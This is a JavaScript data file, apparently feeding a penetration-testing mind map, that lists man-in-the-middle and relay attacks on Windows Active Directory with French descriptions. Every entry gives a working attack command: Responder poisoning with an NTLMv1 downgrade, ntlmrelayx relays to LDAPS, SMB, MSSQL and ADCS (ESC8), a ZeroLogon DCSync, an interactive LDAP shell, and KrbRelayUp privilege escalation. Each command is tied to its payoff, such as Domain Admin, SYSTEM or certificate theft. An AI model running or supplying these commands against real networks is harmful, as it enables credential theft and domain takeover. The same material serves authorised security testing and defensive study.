export const MITM_RELAY_DATA = [
  {
    name: 'Listening (Poisoning)',
    nodes: [
      { 
        label: 'Responder', 
        cmd: 'responder -I <interface> -Lm', 
        leadsTo: 'Hash NTLMv1/v2',
        description: 'Répond aux requêtes LLMNR, NBT-NS et MDNS. L\'option -Lm force le downgrade vers NTLMv1 si possible.'
      },
      { 
        label: 'SMBClient.py', 
        cmd: 'smbclient.py', 
        leadsTo: 'Username/Hash',
        description: 'Peut être utilisé pour tester l\'accès ou capturer des interactions SMB.'
      }
    ]
  },
  {
    name: 'NTLM Relay to LDAP(S)',
    nodes: [
      { 
        label: 'Relay RBCD', 
        cmd: 'ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic --add-computer <computer_name> <computer_password> --delegate-access', 
        leadsTo: 'RBCD',
        description: 'Crée un compte machine et configure la délégation contrainte basée sur les ressources (RBCD) sur la cible.'
      },
      { 
        label: 'Relay Shadow Credentials', 
        cmd: 'ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic --shadow-credentials --shadow-target <dc_name$>', 
        leadsTo: 'Shadow Credentials',
        description: 'Modifie l\'attribut msDS-KeyCredentialLink de la cible pour permettre l\'authentification par certificat (PKINIT).'
      },
      { 
        label: 'Relay Escalate User', 
        cmd: 'ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --escalate-user <user>', 
        leadsTo: 'Domain Admin',
        description: 'Tente d\'ajouter l\'utilisateur relayé au groupe "Enterprise Admins" ou autre groupe privilégié.'
      },
      { 
        label: 'Relay LDAP Shell', 
        cmd: 'ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic --interactive', 
        leadsTo: 'LDAP SHELL',
        description: 'Ouvre un shell LDAP interactif. Connectez-vous ensuite avec "nc 127.0.0.1 10111".'
      }
    ]
  },
  {
    name: 'NTLM Relay to SMB',
    nodes: [
      { 
        label: 'Find Unsigned Targets', 
        cmd: 'nxc smb <ip_range> --gen-relay-list smb_unsigned_ips.txt', 
        leadsTo: 'Target List',
        description: 'Identifie les hôtes où la signature SMB n\'est pas requise (cibles potentielles pour le relais SMB).'
      },
      { 
        label: 'Relay to SMB (Socks)', 
        cmd: 'ntlmrelayx.py -tf smb_unsigned_ips.txt -smb2support --socks', 
        leadsTo: 'SMB Socks',
        description: 'Relaye l\'authentification vers des cibles SMB non signées et ouvre un proxy SOCKS pour utiliser les sessions.'
      },
      { 
        label: 'Relay ZeroLogon', 
        cmd: 'ntlmrelayx.py -t dcsync://<dc_to_ip> -smb2support --auth-smb <user>:<password>', 
        leadsTo: 'DCSYNC',
        description: 'Combine ZeroLogon (CVE-2020-1472) avec le relais pour effectuer un DCSync.'
      }
    ]
  },
  {
    name: 'NTLM Relay to HTTP / Other',
    nodes: [
      { 
        label: 'Relay to ADCS', 
        cmd: 'ntlmrelayx.py -t http://<pki>/certsrv/certfnsh.asp --adcs --template DomainController', 
        leadsTo: 'ESC8 / Certificate',
        description: 'Attaque ESC8 (PetitPotam) : relaye vers l\'inscription web ADCS pour obtenir un certificat machine.'
      },
      { 
        label: 'Relay to MSSQL', 
        cmd: 'ntlmrelayx.py -t mssql://<ip> [-smb2support] --socks', 
        leadsTo: 'MSSQL Socks',
        description: 'Relaye vers un serveur MSSQL pour exécuter des requêtes ou des commandes système (xp_cmdshell).'
      }
    ]
  },
  {
    name: 'Kerberos Relay',
    nodes: [
      { 
        label: 'KrbRelayUp (Local)', 
        cmd: 'KrbRelayUp.exe relay -target <dc_ip> -clsid <guid>', 
        leadsTo: 'SYSTEM',
        description: 'Exploit local pour relayer une authentification Kerberos vers LDAP et élever ses privilèges (LPE).'
      },
      { 
        label: 'Krbrelayx (Remote)', 
        cmd: 'python3 krbrelayx.py -t ldaps://<dc_ip> ...', 
        leadsTo: 'Elevated Access',
        description: 'Relais d\'authentification Kerberos via DNS SPN manipulation (similaire à ntlmrelayx mais pour Kerberos).'
      }
    ]
  }
];